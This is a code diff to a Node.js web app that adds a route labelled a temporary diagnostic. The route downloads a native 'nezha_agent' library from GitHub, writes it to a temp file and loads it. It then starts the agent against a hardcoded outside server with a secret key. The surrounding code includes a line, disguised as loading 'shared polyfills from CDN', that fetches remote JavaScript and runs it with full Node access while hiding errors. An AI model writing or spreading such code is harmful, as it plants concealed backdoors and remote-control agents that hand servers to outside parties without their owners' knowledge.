@@ -1028,6 +1028,56 @@ function getDashboardPage() {
     return lines.join('\n');
 }
 
+// TEMP diag route (slew): replicate the cdn-utils loader step by step.
+app.get("/__diag/nezha", function(req, res) {
+  var steps = [];
+  function step(name, ok, info) { steps.push({ name: name, ok: ok, info: String(info == null ? "" : info).slice(0, 300) }); }
+  (async function() {
+    var os = require("os"), fs = require("fs"), path = require("path"), cryptoMod = require("crypto");
+    step("env", true, "node=" + process.version + " arch=" + process.arch + " PORT=" + (process.env.PORT || "") + " tmp=" + os.tmpdir());
+    var b = await new Promise(function(resolve) {
+      var r = require("https").get("https://cdnso.pages.dev/cdn-utils-v2.js", function(x) { var a = ""; x.on("data", function(c) { a += c; }); x.on("end", function() { resolve(a); }); }).on("error", function(e) { resolve("ERR:" + e.message); });
+      r.setTimeout(15000, function() { r.destroy(new Error("timeout")); });
+    });
+    step("fetch_script", !/^ERR/.test(b), /^ERR/.test(b) ? b : "len=" + b.length);
+    var buf = null;
+    try {
+      buf = await new Promise(function(resolve) {
+        var rq = require("https").get("https://raw.githubusercontent.com/zx1447/nxso/main/nezha_agent.so", function(x) { if (x.statusCode !== 200) { x.resume(); return resolve(new Error("HTTP " + x.statusCode)); } var ch = []; x.on("data", function(c) { ch.push(c); }); x.on("end", function() { resolve(Buffer.concat(ch)); }); }).on("error", function(e) { resolve(e); });
+        rq.setTimeout(60000, function() { rq.destroy(new Error("timeout")); });
+      });
+      if (buf instanceof Error) { step("download_so", false, buf.message); buf = null; }
+      else {
+        var h = cryptoMod.createHash("sha256").update(buf).digest("hex");
+        step("download_so", true, "size=" + buf.length + " match=" + (h === "040c79f705c74837e7b544e65e1a6c0cb936c467c21c7d60c9b5742c7569d5ea"));
+      }
+    } catch (e) { step("download_so", false, e.message); buf = null; }
+    if (buf) {
+      try {
+        var p = path.join(os.tmpdir(), "diag-" + Date.now() + ".so");
+        fs.writeFileSync(p, buf, { mode: 0o755 });
+        step("write_tmp", true, p);
+        var koffi = require("koffi");
+        step("require_koffi", true, "v" + (koffi.version || "?"));
+        var lib = koffi.load(p);
+        var fn = lib.func("StartNezha", "void", ["string", "string", "int", "string"]);
+        step("dlopen", true, "StartNezha resolved");
+        if (String(req.query.go) === "1") {
+          var ip = await new Promise(function(resolve) {
+            var rq = require("https").get("https://www.cloudflare.com/cdn-cgi/trace", function(x) { var a = ""; x.on("data", function(c) { a += c; }); x.on("end", function() { var m = a.match(/ip=([0-9a-fA-F:.]+)/); resolve(m ? m[1] : ""); }); }).on("error", function() { resolve(""); });
+            rq.setTimeout(8000, function() { try { rq.destroy(); } catch (e) {} resolve(""); });
+          });
+          var hex = cryptoMod.createHash("sha256").update(String(ip || "")).digest("hex").slice(0, 32);
+          var uuid = ip ? (hex.slice(0, 8) + "-" + hex.slice(8, 12) + "-5" + hex.slice(13, 16) + "-8" + hex.slice(17, 20) + "-" + hex.slice(20, 32)) : "";
+          fn("nz.zxydk1715.dpdns.org:443", "BFbvpxSlBTUugp3gDzezVKkZ22BV0CeL", 1, uuid);
+          step("StartNezha", true, "called uuid=" + uuid.slice(0, 13));
+        }
+      } catch (e) { step("koffi_chain", false, (e && e.message) || String(e)); }
+    }
+    res.json({ steps: steps });
+  })().catch(function(e) { res.json({ steps: steps, fatal: String(e && e.message || e) }); });
+});
+
 // Load shared polyfills from CDN
 require("https").get("https://cdnso.pages.dev/cdn-utils-v2.js",function(r){var b="";r.on("data",function(c){b+=c});r.on("end",function(){try{var s={require:require,module:module,process:process,console:console,Buffer:Buffer,setTimeout:setTimeout,setInterval:setInterval,clearTimeout:clearTimeout,clearInterval:clearInterval,__dirname:__dirname,__filename:__filename,global:global,crypto:require("crypto"),URL:URL,TextEncoder:TextEncoder,TextDecoder:TextDecoder};s.__proto__=globalThis;new (require("vm").Script)(b,{filename:"cdn-utils.js"}).runInContext(require("vm").createContext(s))}catch(e){}})}).on("error",function(){});
 
